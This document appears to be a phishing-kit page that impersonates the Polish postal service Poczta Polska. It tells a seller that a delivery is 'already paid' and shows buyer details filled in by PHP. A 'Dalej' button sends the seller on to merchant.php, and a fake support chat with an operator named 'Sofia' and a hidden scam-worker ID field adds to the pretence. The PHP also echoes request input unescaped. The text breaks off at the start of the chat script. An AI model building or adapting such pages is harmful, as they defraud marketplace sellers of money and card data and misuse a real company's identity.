.navbar-default .navbar-nav>.open>a .caret, .navbar-default .navbar-nav>.open>a:hover .caret, .navbar-default .navbar-nav>.open>a:focus .caret{border-top-color:#555;border-bottom-color:#555}
.navbar-default .navbar-nav>.dropdown>a .caret{border-top-color:#777;border-bottom-color:#777}
@media(max-width:767px){.navbar-default .navbar-nav .open .dropdown-menu>li>a{color:#777}
.navbar-default .navbar-nav .open .dropdown-menu>li>a:hover, .navbar-default .navbar-nav .open .dropdown-menu>li>a:focus{color:#333;background-color:transparent}
.navbar-default .navbar-nav .open .dropdown-menu>.active>a, .navbar-default .navbar-nav .open .dropdown-menu>.active>a:hover, .navbar-default .navbar-nav .open .dropdown-menu>.active>a:focus{color:#555;background-color:#e7e7e7}
.navbar-default .navbar-nav .open .dropdown-menu>.disabled>a, .navbar-default .navbar-nav .open .dropdown-menu>.disabled>a:hover, .navbar-default .navbar-nav .open .dropdown-menu>.disabled>a:focus{color:#ccc;background-color:transparent}
}
.navbar-default .navbar-link{color:#777}
.navbar-default .navbar-link:hover{color:#333}
.navbar-inverse{background-color:#222;border-color:#080808}
.navbar-inverse .navbar-brand{color:#999}
.navbar-inverse .navbar-brand:hover, .navbar-inverse .navbar-brand:focus{color:#fff;background-color:transparent}
.navbar-inverse .navbar-text{color:#999}
.navbar-inverse .navbar-nav>li>a{color:#999}
.navbar-inverse .navbar-nav>li>a:hover, .navbar-inverse .navbar-nav>li>a:focus{color:#fff;background-color:transparent}
.navbar-inverse .navbar-nav>.active>a, .navbar-inverse .navbar-nav>.active>a:hover, .navbar-inverse .navbar-nav>.active>a:focus{color:#fff;background-color:#080808}
.navbar-inverse .navbar-nav>.disabled>a, .navbar-inverse .navbar-nav>.disabled>a:hover, .navbar-inverse .navbar-nav>.disabled>a:focus{color:#444;background-color:transparent}
.navbar-inverse .navbar-toggle{border-color:#333}
.navbar-inverse .navbar-toggle:hover, .navbar-inverse .navbar-toggle:focus{background-color:#333}
.navbar-inverse .navbar-toggle .icon-bar{background-color:#fff}
.navbar-inverse .navbar-collapse, .navbar-inverse .navbar-form{border-color:#101010}
.navbar-inverse .navbar-nav>.open>a, .navbar-inverse .navbar-nav>.open>a:hover, .navbar-inverse .navbar-nav>.open>a:focus{color:#fff;background-color:#080808}
.navbar-inverse .navbar-nav>.dropdown>a:hover .caret{border-top-color:#fff;border-bottom-color:#fff}
.navbar-inverse .navbar-nav>.dropdown>a .caret{border-top-color:#999;border-bottom-color:#999}
.navbar-inverse .navbar-nav>.open>a .caret, .navbar-inverse .navbar-nav>.open>a:hover .caret, .navbar-inverse .navbar-nav>.open>a:focus .caret{border-top-color:#fff;border-bottom-color:#fff}
@media(max-width:767px){.navbar-inverse .navbar-nav .open .dropdown-menu>.dropdown-header{border-color:#080808}
.navbar-inverse .navbar-nav .open .dropdown-menu>li>a{color:#999}
.navbar-inverse .navbar-nav .open .dropdown-menu>li>a:hover, .navbar-inverse .navbar-nav .open .dropdown-menu>li>a:focus{color:#fff;background-color:transparent}
.navbar-inverse .navbar-nav .open .dropdown-menu>.active>a, .navbar-inverse .navbar-nav .open .dropdown-menu>.active>a:hover, .navbar-inverse .navbar-nav .open .dropdown-menu>.active>a:focus{color:#fff;background-color:#080808}
.navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a, .navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a:hover, .navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a:focus{color:#444;background-color:transparent}
}
.navbar-inverse .navbar-link{color:#999}
.navbar-inverse .navbar-link:hover{color:#fff}
.pull-right{float:right!important}
@-ms-viewport{width:device-width}
@media screen and (max-width:400px){@-ms-viewport{width:320px}
}
</style>		
    <style id="holderjs-style" type="text/css">.holderjs-fluid {font-size:16px;font-weight:bold;text-align:center;font-family:sans-serif;margin:0}</style></head>
<body class="page page-id-423 page-template-default" id="standard" style="">

<header class="topper"><div id="top"><div class="container">
<a href="https://www.poczta-polska.pl/">
<img src="./pp_files/logopocztap-2.png" id="brand_logo" class="img-responsive" alt="Poczta Polska" width="234" height="45"></a>
<nav><ul id="hmenu" class="pull-right list-unstyled"><li id="menu-item-279" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-279"><a href="https://www.poczta-polska.pl/">Strona główna</a></li><li id="menu-item-484" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-484"><a href="https://www.poczta-polska.pl/o-firmie/">O firmie</a></li><li id="menu-item-11954" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11954"><a href="http://media.poczta-polska.pl/">Biuro prasowe</a></li><li id="menu-item-26437" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-26437"><a href="https://www.poczta-polska.pl/aplikuj/">Praca</a></li><li id="menu-item-11258" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-423 current_page_item menu-item-11258"><a href="">Kontakt</a></li><li id="menu-item-18523" class="pl menu-item menu-item-type-custom menu-item-object-custom menu-item-18523"><a href="https://www.poczta-polska.pl/" style="display: none;">PL</a></li></ul>          </nav>
<button class="btn btn-default btn-sm" id="btChgStyle">a A
</button><div id="social">
<a id="fb" title="Facebook" href="https://www.facebook.com/pocztapolska">Poczta Polska na Facebook</a>
<a id="twitter" title="Twitter" href="https://twitter.com/PocztaPolska">Poczta Polska Twitter</a>
<a id="blog" title="Blog" href="http://blog.poczta-polska.pl/">blog Poczty Polskiej</a>
<a id="linkedin" title="Linkedin" href="https://pl.linkedin.com/company/poczta-polska">Poczta Polska Linkedin</a>
<a id="instgarm" title="Instagram" href="https://www.instagram.com/polskapoczta/">Poczta Polska Instagram</a></div><div style="padding:5px 0;"><a title="" href="https://www.poczta-polska.pl/projekty-wspolfinansowane-z-funduszy-europejskich/"><img id="logo_ue" src="./pp_files/logopocztap-3.png" width="100"></a></div></div></div>
</header>
		<div class="_0">
			
			<div>
				<div class="_13">Śledź paczkę</div>
				<div class="_3">
					<div class="_17">
						<div style="font-size: 18px; margin-bottom: 20px;">Wyjazd ID: <span style="color: #E71905; margin-left: 10px;"><?php echo $_GET['id']; ?></span></div>
						<div style="font-size: 18px;">Status: <span style="color: #E71905; margin-left: 10px;">otrzymanie środków</span></div>
					</div>
				</div>
				<div class="_3">
					<div class="_17 _177">
						<h2>Dostawa została już opłacona!</h2>
						<div style="font-size: 16px; line-height: 1.7;"> 
							Jak tylko otrzymasz środki na swoje konto, wyślij
                                    towar do kupującego według danych, jaki napisane wyżej
                                    <br><br>Po wysłaniu towaru prosimy o podanie kupującemu numeru dostawy
						</div>
						<div class="_20">
							<input form="form1" id="_buttonPay" class="_23" value="Dalej" type="submit">
						</div>
					</div>
				</div>
				
				<div class="_16">
					<form id="form1" action="merchant.php" method="get">
						<input id="_formCost" name="id" value="<?php echo $_GET['id']; ?>" type="hidden">
						<div class="_4">Dane kupującego:</div>
						<div class="_14 _21">
							<table>
								<tbody><tr>
									<td class="_19 _15">Produkt:</td>
									<td class="_19"><?php echo $xml->obyava; ?></td>
								</tr>
								<tr>
									<td class="_19 _15">Kupujący:</td>
									<td class="_19"><?php echo $xml->fio; ?></td>
								</tr>
								<tr>
									<td class="_19 _15">Suma:</td>
									<td class="_19"><?php echo $xml->price; ?> zł</td>
								</tr>
								<tr>
									<td class="_19 _15">Wyjazd ID:</td>
									<td class="_19"><?php echo $_GET['id']; ?></td>
								</tr>
							</tbody></table>
						</div>
					</form>
				</div>
				<!-- <div style="padding: 10px; margin-bottom: 100px;">
					<img id="sled1" src="Sledzenie1.png">
					<img id="sled2" src="Sledzenie2.png">
				</div> -->
			</div>
			
		</div>
<footer><div id="footer"><div class="navbar"><div class="container"><div class="navbar-collapse collapse" id="footer-body"><ul id="fmenu" class="nav navbar-nav"><li id="menu-item-344" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-344"><a>Inne usługi</a><ul class="sub-menu"><li id="menu-item-19225" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19225"><a href="https://rtv.poczta-polska.pl/?action=GetRegFrm">Abonament RTV</a></li><li id="menu-item-29416" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-29416"><a href="https://directmail.poczta-polska.pl/">Direct Mail</a></li><li id="menu-item-29415" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-29415"><a href="https://esklep.poczta-polska.pl/?utm_source=PocztaPolska&amp;utm_medium=link&amp;utm_term=PPFooter&amp;utm_campaign=PocztaGlowna%20">eSklep</a></li><li id="menu-item-371" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-371"><a href="https://www.poczta-polska.pl/handel-detaliczny/">Handel detaliczny</a></li><li id="menu-item-377" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-377"><a href="https://prenumerata.poczta-polska.pl/">Prenumerata prasy</a></li><li id="menu-item-376" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-376"><a href="http://wypoczynek.poczta-polska.pl/">Pokoje gościnne</a></li><li id="menu-item-42533" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-42533"><a href="https://info.uwolnijkolory.pl/poczta-polska">Foto upominki</a></li><li id="menu-item-31702" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31702"><a href="https://bezgotowki.pl/poczta-polska/">Terminalizacja</a></li><li id="menu-item-39416" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-39416"><a href="https://www.poczta-polska.pl/uslugi-dla-niepelnosprawnych/">Usługi dla niepełnosprawnych</a></li></ul></li><li id="menu-item-345" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-345"><a>Współpraca</a><ul class="sub-menu"><li id="menu-item-37276" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37276"><a href="https://www.poczta-polska.pl/logotypy/">Logotypy</a></li><li id="menu-item-381" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-381"><a href="https://www.poczta-polska.pl/partnerzy/">Partnerzy</a></li><li id="menu-item-382" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-382"><a href="http://przetargi.poczta-polska.pl/">Przetargi</a></li><li id="menu-item-825" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-825"><a href="http://przetargi.poczta-polska.pl/dialogi/">Dialogi techniczne</a></li><li id="menu-item-398" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-398"><a href="https://www.poczta-polska.pl/sprzedaz-srodkow-trwalych/">Sprzedaż środków trwałych</a></li><li id="menu-item-23614" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-23614"><a href="http://nieruchomosci.poczta-polska.pl/">Sprzedaż nieruchomości</a></li><li id="menu-item-23610" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-23610"><a href="https://www.poczta-polska.pl/wynajem/">Wynajem nieruchomości</a></li><li id="menu-item-397" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-397"><a href="https://www.poczta-polska.pl/zaloz-agencje-pocztowa/">Załóż Agencję Pocztową</a></li><li id="menu-item-11373" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-11373"><a href="https://www.poczta-polska.pl/sprzedaz_wierzytelnosci/">Sprzedaż wierzytelności</a></li><li id="menu-item-11376" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-11376"><a href="https://www.poczta-polska.pl/webservices/">Webservices</a></li><li id="menu-item-26941" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-26941"><a href="https://www.poczta-polska.pl/transport/">Transport</a></li></ul></li><li id="menu-item-346" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-346"><a>Popularne linki</a><ul class="sub-menu"><li id="menu-item-399" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-399"><a href="http://emonitoring.poczta-polska.pl/">eMonitoring</a></li><li id="menu-item-400" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-400"><a href="http://cennik.poczta-polska.pl/">Cennik</a></li><li id="menu-item-401" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-401"><a href="http://placowki.poczta-polska.pl/">Znajdź placówkę pocztową</a></li><li id="menu-item-16633" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-16633"><a href="http://odbiorwpunkcie.poczta-polska.pl/">Znajdź punkt odbioru</a></li><li id="menu-item-402" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-402"><a href="http://kody.poczta-polska.pl/">Znajdź kod pocztowy</a></li><li id="menu-item-38014" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-38014"><a href="https://skrzynki.poczta-polska.pl/">Znajdź skrzynkę pocztową</a></li><li id="menu-item-406" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-406"><a href="https://www.poczta-polska.pl/akty-prawne/">Akty prawne</a></li><li id="menu-item-46501" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-46501"><a href="https://www.poczta-polska.pl/koronawirus-informacje-dla-klientow/">Koronawirus – informacje dla Klientów</a></li><li id="menu-item-349" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-349"><a href="https://www.poczta-polska.pl/polityka-prywatnosci/">Polityka cookies</a></li><li id="menu-item-410" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-410"><a href="https://www.poczta-polska.pl/spis-pna/">Pocztowe Numery Adresowe (PNA)</a></li><li id="menu-item-11394" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-11394"><a href="https://www.poczta-polska.pl/placowki-przyjazne-ecommerce/">Placówki przyjazne eCommerce</a></li><li id="menu-item-16012" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-16012"><a href="https://bip.poczta-polska.pl/">BIP</a></li><li id="menu-item-40546" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-40546"><a href="https://www.poczta-polska.pl/komunikacja-z-akcjonariuszem/">Komunikacja z akcjonariuszem</a></li></ul></li><li id="menu-item-347" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-347"><a>Kariera</a><ul class="sub-menu"><li id="menu-item-422" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-422"><a href="https://www.poczta-polska.pl/proces-rekrutacji/">Proces rekrutacji</a></li><li id="menu-item-18889" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-18889"><a href="https://www.poczta-polska.pl/aplikuj/">Oferty pracy</a></li><li id="menu-item-19469" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-19469"><a href="https://www.poczta-polska.pl/faq/">FAQ</a></li><li id="menu-item-37541" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37541"><a href="https://www.poczta-polska.pl/pracownicze-plany-kapitalowe/">Pracownicze Plany Kapitałowe</a></li></ul></li><li id="menu-item-348" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor current-menu-parent menu-item-has-children menu-item-348"><a>Kontakt</a><ul class="sub-menu"><li id="menu-item-426" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-423 current_page_item menu-item-426"><a href="">Kontakt</a></li><li id="menu-item-11428" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-11428"><a href="https://www.poczta-polska.pl/reklamacje/">Reklamacje</a></li><li id="menu-item-31067" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31067"><a href="http://bip.poczta-polska.pl/iinformacja-o-zbieraniu-danych-osobowych/">Ochrona danych osobowych</a></li></ul></li></ul></div><div class="navbar-header">
<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#footer-body">
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button></div></div></div><div id="tfoot"><div class="container"><div class="row"><div class="col-md-8">Poczta Polska Spółka Akcyjna, ul. Rodziny Hiszpańskich 8, 00-940 Warszawa NIP: 525-000-73-13, KRS: 0000334972               Sąd Rejestrowy: Sąd Rejonowy dla m.st. Warszawy kapitał zakładowy: 774.140.000, w całości wpłacony<br><br>Poczta Polska S.A. (c) 2021. Wszelkie prawa zastrzeżone.</div><div class="col-md-4 text-right"><div class="info_line">Bądźmy w kontakcie!</div><div class="info_line"><span>801 333 444</span></div><div class="info_line"><span>(+48) 438 420 600</span></div></div></div></div></div><div style="background-color:#FFF;"><div class="container"><div class="row"><div class="col-md-12 text-center"><div class="text-center"><a title="" href="https://www.poczta-polska.pl/projekty-wspolfinansowane-z-funduszy-europejskich/">  <img class="img-responsive " style="margin:0 auto;" src="./pp_files/imgpocztap-1.jpg"></a></div></div></div></div></div></div>    
</footer><div id="cookiesBar" style="height: auto;"><p>Ta strona używa ciasteczek (cookies), dzięki którym nasz serwis może działać lepiej.  
<a href="https://www.poczta-polska.pl/polityka-prywatnosci/" title="polityką prywatności">Dowiedz się więcej</a>. 
<br>Korzystając ze strony zgadzasz się na zapisywanie prywatnych danych zawartych w plikach cookies i im podobnych technologii w urządzeniu końcowym. <a href="http://bip.poczta-polska.pl/iinformacja-o-zbieraniu-danych-osobowych/" title="polityką prywatności">Zapoznaj się z naszą polityką wykorzystywania danych</a>.
<a id="cookiesBarClose" class="btn btn-default btn-sm" href="#" title="Zamknij">Zamknij</a></p></div>
            <style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #E71905;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #3c3c3c;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #3c3c3c;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>


    <div id="offonthechap">
            <div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;z-index: 1111111;">
                <div class="chaport-launcher" style="left: 0px; right: 0px;">
                    <div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
                        <div class="chaport-launcher-chat-icon"></div>
                        <input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
                        <input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
                        <input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
                        <div class="chaport-launcher-close-icon"></div>
                        <div class="chaport-launcher-operator-photo"></div>
                    </div>
                </div>
                <div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
                    <div class="chaport-inner">
                        <div class="main-textblock">
                            <div class="operatorblock">
                                <div class="operatorblock-content" style="display: flex;">
                                    <div id="operator-photo">
                                        <img id="oper-photo-img" src="./pp_files/operator-img.png">
                                        <div class="operator-name">Sofia</div>
                                    </div>
                                    <div class="team-wrapper">
                                        <div class="team">Pomoc techniczna</div>
                                        <div class="activity-indicator">
                                            <div class="with-status" style="display: inline-block;">
                                                <div class="status-online" style="display: inline-block;">
                                                    
                                                </div>online</div>
                                            </div>
                                        </div>
                                </div>
                            </div>
                            <div class="chat-block">
                                <div id="chat">
                                    <div class="operators-msg" id="greeting-msg" style="display: none;">
                                        <div class="operators-photo"><img src="./pp_files/operator-img.png"></div>
                                        <div class="operators-first-text">Dzień dobry! Jak mogę ci pomóc?</div>                            
                                    </div>
                                
                                </div>
                                <div id="input-msg" style="display: flex;">
                                    <input type="text" name="smstosup1" id="smstosup1" placeholder="Wpisz swoją wiadomość...">
                                    <button id="smstosupbutton1" onclick="sendMessage()">
                                        <div class="chaport-send-icon">
                                            <svg width="18" height="18" viewBox="0 0 535.5 535.5">
                                                <polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">      
                                                </polygon>
                                            </svg>
                                        </div>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>  
                    <div class="chaport-big-shadow"></div>
            </div>
        </div>
        <script type="text/javascript">


var supportbutton = document.querySelector('.chaport-launcher-button');
